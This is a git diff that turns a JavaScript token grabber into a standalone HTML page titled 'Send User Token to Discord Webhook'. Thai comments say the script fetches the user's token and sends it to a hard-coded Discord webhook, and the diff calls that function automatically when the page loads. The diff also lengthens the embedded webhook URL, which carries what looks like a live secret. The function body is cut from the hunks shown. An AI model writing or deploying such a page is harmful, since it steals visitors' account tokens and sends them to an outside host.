@@ -1,5 +1,15 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Send User Token to Discord Webhook</title>
+</head>
+<body>
+
+<script>
 // URL ของ Webhook ของ Discord
-const webhookUrl = 'https://discord.com/api/webhooks/1247307479834955797/XtrU8R1FXI-BoZKR0ZLS4nGhuiUS-sQH9tRRMAkusu6E9Fz81eVP4';
+const webhookUrl = 'https://discord.com/api/webhooks/1247307479834955797/XtrU8R1FXI-BoZKR0ZLS4nGhuiUS-sQH9tRRMAkusu6E9Fz81eVP4hsxyAWA35ZPGiJY';
 
 // ฟังก์ชันสำหรับการดึง Token ผู้ใช้งานและส่งไปยัง Webhook
 function getTokenAndSendToWebhook() {
@@ -27,3 +37,7 @@ function getTokenAndSendToWebhook() {
 
 // เรียกใช้ฟังก์ชันเมื่อเรียกใช้หน้าเว็บ
 getTokenAndSendToWebhook();
+</script>
+
+</body>
+</html>
